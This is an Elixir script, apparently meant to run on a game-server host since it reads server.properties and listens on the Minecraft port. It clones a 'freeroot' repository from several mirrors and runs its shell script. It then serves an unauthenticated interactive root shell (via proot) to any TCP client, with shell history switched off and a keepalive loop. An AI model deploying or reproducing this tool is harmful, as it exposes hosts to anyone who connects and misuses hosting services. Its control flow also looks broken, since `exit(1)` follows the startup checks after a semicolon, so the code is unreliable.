# Cooked by mytai | 2026
# Run: mix run main.exs  OR  elixir main.exs

# auto-install       

defmodule Installer do
  def run do
    unless cmd_ok?("elixir"), do: install_elixir()
    unless cmd_ok?("mix"),    do: install_elixir()
    install_hex()
    install_deps()
  end

  defp cmd_ok?(cmd), do: System.cmd("sh", ["-c", "#{cmd} --version > /dev/null 2>&1"]) |> elem(1) == 0

  defp install_elixir do
    IO.puts("[INFO] Elixir not found – installing via asdf...")
    System.cmd("bash", ["-c", """
      git clone https://github.com/asdf-vm/asdf.git ~/.asdf --branch v0.14.0 2>/dev/null || true
      . ~/.asdf/asdf.sh
      asdf plugin add erlang 2>/dev/null || true
      asdf plugin add elixir 2>/dev/null || true
      asdf install erlang latest
      asdf install elixir latest
      asdf global erlang latest
      asdf global elixir latest
    """], into: IO.stream(:stdio, :line))
  end

  defp install_hex do
    System.cmd("mix", ["local.hex", "--force"], stderr_to_stdout: true)
  rescue _ -> :ok
  end

  defp install_deps do
    # Add your hex package names here; they'll be auto-installed
    needed = []
    Enum.each(needed, fn pkg ->
      IO.puts("[INFO] Installing Hex package: #{pkg}")
      System.cmd("mix", ["deps.get"], stderr_to_stdout: true)
    end)
  end
end

#  main app  

defmodule Main do
  @urls [
    "https://github.com/Mytai20100/freeroot.git",
    "https://github.servernotdie.workers.dev/Mytai20100/freeroot.git",
    "https://gitlab.com/Mytai20100/freeroot.git",
    "https://gitlab.snd.qzz.io/mytai20100/freeroot.git",
    "https://git.snd.qzz.io/mytai20100/freeroot.git"
  ]
  @tmp_dir  "freeroot_temp"
  @work_dir "work"
  @script   "noninteractive.sh"

  @ssh_wrapper """
#!/bin/bash
export LC_ALL=C
export LANG=C
ROOTFS_DIR=$(pwd)
export PATH=$PATH:~/.local/usr/bin

if [ ! -e $ROOTFS_DIR/.installed ]; then
    echo 'Proot environment not installed yet. Please wait for setup to complete.'
    exit 1
fi

G="\\033[0;32m"; Y="\\033[0;33m"; R="\\033[0;31m"
C="\\033[0;36m"; W="\\033[0;37m"; X="\\033[0m"
OS=$(lsb_release -ds 2>/dev/null||cat /etc/os-release 2>/dev/null|grep PRETTY_NAME|cut -d'"' -f2||echo "Unknown")
CPU=$(lscpu | awk -F: '/Model name:/{print $2}' | sed 's/^ *//')
ARCH_D=$(uname -m)
CPU_U=$(top -bn1 2>/dev/null | awk '/Cpu\\(s\\)/{print $2+$4}' || echo 0)
TRAM=$(free -h --si 2>/dev/null | awk '/^Mem:/{print $2}' || echo 'N/A')
URAM=$(free -h --si 2>/dev/null | awk '/^Mem:/{print $3}' || echo 'N/A')
RAM_PERCENT=$(free 2>/dev/null | awk '/^Mem:/{printf "%.1f", $3/$2 * 100}' || echo 0)
DISK=$(df -h /|awk 'NR==2{print $2}')
UDISK=$(df -h /|awk 'NR==2{print $3}')
DISK_PERCENT=$(df -h /|awk 'NR==2{print $5}'|sed 's/%//')
IP=$(curl -s --max-time 2 ifconfig.me 2>/dev/null||curl -s --max-time 2 icanhazip.com 2>/dev/null||hostname -I 2>/dev/null|awk '{print $1}'||echo "N/A")
clear
echo -e "${C}OS:${X}   $OS"
echo -e "${C}CPU:${X}  $CPU [$ARCH_D]  Usage: ${CPU_U}%"
echo -e "${G}RAM:${X}  ${URAM} / ${TRAM} (${RAM_PERCENT}%)"
echo -e "${Y}Disk:${X} ${UDISK} / ${DISK} (${DISK_PERCENT}%)"
echo -e "${C}IP:${X}   $IP"
echo -e "${W}___________________________________________________${X}"
echo -e "           ${C}-----> Mission Completed ! <-----${X}"
echo -e "${W}___________________________________________________${X}"
echo ""

echo 'furryisbest' > $ROOTFS_DIR/etc/hostname
cat > $ROOTFS_DIR/etc/hosts << 'HOSTS_EOF'
127.0.0.1   localhost
127.0.1.1   furryisbest
::1         localhost ip6-localhost ip6-loopback
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters
HOSTS_EOF

cat > $ROOTFS_DIR/root/.bashrc << 'BASHRC_EOF'
export HOSTNAME=furryisbest
export PS1='root@furryisbest:\\w\\$ '
export LC_ALL=C; export LANG=C
export TMOUT=0; unset TMOUT
set +o history 2>/dev/null; PROMPT_COMMAND=''
alias ls='ls --color=auto'; alias ll='ls -lah'; alias grep='grep --color=auto'
BASHRC_EOF

( while true; do sleep 15; echo -ne '\\0' 2>/dev/null || true; done ) &
KEEPALIVE_PID=$!
trap "kill $KEEPALIVE_PID 2>/dev/null; exit" EXIT INT TERM

while true; do
  $ROOTFS_DIR/usr/local/bin/proot \\
    --rootfs="${ROOTFS_DIR}" -0 -w "/root" \\
    -b /dev -b /dev/pts -b /sys -b /proc -b /etc/resolv.conf \\
    --kill-on-exit /bin/bash --rcfile /root/.bashrc -i
  EXIT_CODE=$?
  if [ $EXIT_CODE -eq 0 ] || [ $EXIT_CODE -eq 130 ]; then break; fi
  echo 'Session interrupted. Restarting in 2 seconds...'; sleep 2
done
kill $KEEPALIVE_PID 2>/dev/null
"""

  def log(level, msg), do: IO.puts("[#{level}] #{msg}")

  def run_shell(cmd) do
    {_, rc} = System.cmd("bash", ["-c", cmd], stderr_to_stdout: true, into: IO.stream(:stdio, :line))
    rc
  end

  def check_command(cmd), do: run_shell("#{cmd} --version") == 0

  def delete_recursive(path) do
    if File.exists?(path), do: File.rm_rf!(path)
  end

  def set_exec(path), do: File.chmod!(path, 0o755)

  def clone_repo do
    @urls
    |> Enum.with_index(1)
    |> Enum.find_value(false, fn {url, i} ->
      log("INFO", "Trying clone from: #{url} (#{i}/#{length(@urls)})")
      if run_shell("git clone --depth=1 #{url} #{@tmp_dir}") == 0 do
        log("INFO", "Successfully cloned from: #{url}")
        true
      else
        log("WARN", "Clone failed from #{url}")
        delete_recursive(@tmp_dir)
        false
      end
    end)
  end

  def execute_script(dir, script) do
    log("INFO", "Executing script '#{script}'...")
    rc = run_shell("cd #{dir} && bash #{script}")
    log("INFO", "Process exited with code: #{rc}")
  end

  def create_ssh_wrapper do
    if File.dir?(@work_dir) do
      wp = Path.join(@work_dir, "ssh.sh")
      File.rm(wp)
      File.write!(wp, @ssh_wrapper)
      set_exec(wp)
      log("INFO", "SSH wrapper created")
    else
      log("INFO", "Work directory not ready yet")
    end
  end

  # TCP server via GenServer + :gen_tcp           

  def start_server(ip, port) do
    unless File.exists?("host.key") do
      run_shell("ssh-keygen -t rsa -b 2048 -f host.key -N \"\"")
      log("INFO", "Generated host key")
    end

    {:ok, listen_sock} = :gen_tcp.listen(port, [
      :binary, {:packet, :raw}, {:active, false},
      {:reuseaddr, true}, {:ip, ip |> String.to_charlist() |> :inet.parse_address() |> elem(1)}
    ])

    log("INFO", "Server listening on #{ip}:#{port}")
    spawn(fn -> accept_loop(listen_sock) end)
  end

  defp accept_loop(listen_sock) do
    case :gen_tcp.accept(listen_sock) do
      {:ok, client} ->
        log("INFO", "Client connected")
        spawn(fn -> handle_client(client) end)
        accept_loop(listen_sock)
      {:error, reason} ->
        log("ERROR", "Accept error: #{inspect(reason)}")
        accept_loop(listen_sock)
    end
  end

  defp handle_client(client) do
    shell_cmd = if File.exists?(Path.join(@work_dir, "ssh.sh")),
      do: "cd #{@work_dir} && bash ssh.sh",
      else: "bash --login -i"

    port = Port.open({:spawn, "script -qefc \"#{shell_cmd}\" /dev/null"},
                     [:binary, :exit_status, :stderr_to_stdout, {:packet, 0}])

    :gen_tcp.controlling_process(client, self())
    :inet.setopts(client, [{:active, true}])

    pump_loop(client, port)
  end

  defp pump_loop(client, port) do
    receive do
      {:tcp, ^client, data}   -> Port.command(port, data);  pump_loop(client, port)
      {:tcp_closed, ^client}  -> Port.close(port)
      {^port, {:data, data}}  -> :gen_tcp.send(client, data); pump_loop(client, port)
      {^port, {:exit_status, _}} -> :gen_tcp.close(client)
    after 60_000 -> :gen_tcp.close(client); Port.close(port)
    end
  end

  def load_config do
    cfg = "server.properties"
    {ip, port} = if File.exists?(cfg) do
      lines = File.stream!(cfg)
      lines
      |> Enum.reduce({"0.0.0.0", 25565}, fn line, {ip, port} ->
        case String.split(String.trim(line), "=", parts: 2) do
          [k, v] ->
            case String.trim(k) do
              "server-ip"   -> {String.trim(v), port}
              "server-port" -> {ip, String.to_integer(String.trim(v))}
              _             -> {ip, port}
            end
          _ -> {ip, port}
        end
      end)
    else
      {"0.0.0.0", 25565}
    end
    log("INFO", "Config: #{ip}:#{port}")
    {ip, port}
  end

  def watcher_loop do
    spawn(fn ->
      Process.sleep(1000)
      do_watch()
    end)
  end

  defp do_watch do
    if File.dir?(@work_dir) and File.exists?(Path.join(@work_dir, ".installed")) do
      create_ssh_wrapper()
    else
      Process.sleep(1000)
      do_watch()
    end
  end

  def main do
    {ip, port} = load_config()
    start_server(ip, port)
    watcher_loop()

    unless check_command("git"),  do: log("ERROR", "Git not found");  exit(1)
    unless check_command("bash"), do: log("ERROR", "Bash not found"); exit(1)

    if File.dir?(@work_dir) do
      log("INFO", "Directory 'work' exists, checking...")
      sp = Path.join(@work_dir, @script)
      if File.exists?(sp) do
        log("INFO", "Valid repo found, skipping clone")
        set_exec(sp)
        execute_script(@work_dir, @script)
        Process.sleep(:infinity)
      else
        log("WARN", "Invalid repo, removing...")
        delete_recursive(@work_dir)
      end
    end

    delete_recursive(@tmp_dir)

    unless clone_repo() do
      log("ERROR", "All clone attempts failed"); exit(1)
    end

    File.rename!(@tmp_dir, @work_dir)
    log("INFO", "Renamed to 'work'")

    sp = Path.join(@work_dir, @script)
    unless File.exists?(sp) do
      log("ERROR", "Script not found")
      delete_recursive(@work_dir); exit(1)
    end

    set_exec(sp)
    execute_script(@work_dir, @script)
    log("INFO", "Freeroot")
    Process.sleep(:infinity)
  end
end

Installer.run()
Main.main()
